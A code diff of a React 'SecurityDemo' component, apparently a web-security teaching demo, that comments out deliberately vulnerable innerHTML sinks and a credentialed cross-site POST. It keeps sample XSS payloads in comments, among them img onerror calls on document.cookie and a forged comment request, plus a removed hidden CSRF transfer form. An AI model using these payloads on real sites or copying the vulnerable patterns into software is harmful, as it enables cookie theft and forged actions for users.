@@ -5,6 +5,7 @@ export default class SecurityDemo extends Component {
     constructor() {
         super();
         this.state = {
+            //%3Cimg%20src=1%20onerror=alert(document.cookie)%3E%3C/div%3E
             // <script charset="utf-8">alert(123)</script>
             // xss: '<div class="btn-n" onclick="(function(){console.log(123)})()">asdf<img src=1 onerror=alert(document.cookie)></div>'
             xss: ''
@@ -16,13 +17,10 @@ export default class SecurityDemo extends Component {
         // myScript.type = 'text/javascript';
         // myScript.innerHTML = 'alert(123)';
         // document.body.appendChild(myScript);
-        this.refs.xss1.innerHTML = this.getParams('name');
-        this.steal();
+
+        // this.refs.xss1.innerHTML = this.getParams('name');
     }
-    haneldChangeXSS(v) {
-        this.setState({ xss: v });
-        this.refs.xss.innerHTML = v;
-    }
+    
     getParams(key) {
         const reg = new RegExp(`(&|^)${key}=([^&]*)($|&)`);
         const res = window.location.search.substr(1).match(reg);
@@ -31,32 +29,32 @@ export default class SecurityDemo extends Component {
         }
         return null;
     }
-    steal() {
-        // const iframe = document.frames['steal'];
-        const iframe = this.refs.csrf;
-        // iframe.document.Submit('transfer');
-        console.dir(iframe);
-    }
+
     requestPost() {
-        const xhr = new XMLHttpRequest();
-        const url = 'http://www.brandf.cn:8010/article';
-        // let fd = new FormData();
-        // fd.append('people', '123');
-        // fd.append('ck', '123');
-        const data = JSON.stringify({
-            content: 'csrf23333',
-            id: '',
-            title: 'csrf23333'
-        });
-        xhr.open('POST', url);
-        xhr.setRequestHeader('content-type', 'application/json');
-        xhr.withCredentials = true;
-        xhr.send(data);
-        xhr.onreadystatechange = function () {
-            if (xhr.readyState == 4 && xhr.status == 200) {
-                console.log(xhr.response);
-            }
-        };
+        // const xhr = new XMLHttpRequest();
+        // const url = 'http://www.brandf.cn:8010/article';
+        // // let fd = new FormData();
+        // // fd.append('people', '123');
+        // // fd.append('ck', '123');
+        // const data = JSON.stringify({
+        //     content: 'csrf23333',
+        //     id: '',
+        //     title: 'csrf23333'
+        // });
+        // xhr.open('POST', url);
+        // xhr.setRequestHeader('content-type', 'application/json');
+        // xhr.withCredentials = true;
+        // xhr.send(data);
+        // xhr.onreadystatechange = function () {
+        //     if (xhr.readyState == 4 && xhr.status == 200) {
+        //         console.log(xhr.response);
+        //     }
+        // };
+    }
+
+    haneldChangeXSS(v) {
+        this.setState({ xss: v });
+        // this.refs.xss.innerHTML = v;
     }
     render() {
         return (
@@ -72,12 +70,10 @@ export default class SecurityDemo extends Component {
                     <script>
                         {this.requestPost()}
                     </script>
-                    {/* <form method="POST" name="transfer" action="http://www.brandf.cn:8010/article">
-                        <input type="hidden" name="toBankId" value="11" />
-                        <input type="hidden" name="money" value="1000" />
-                    </form> */}
                 </iframe>
             </div>
         );
     }
 }
+
+{/* <img src=1 onerror=function(){var x = new XMLHttpRequest();var u = 'http://localhost:8010/comment/normal';var d = JSON.stringify({article_id: '58',comment: '1233211234567'});x.open('POST', u);x.setRequestHeader('content-type', 'application/json');x.withCredentials = true;x.send(d);}/> */ }
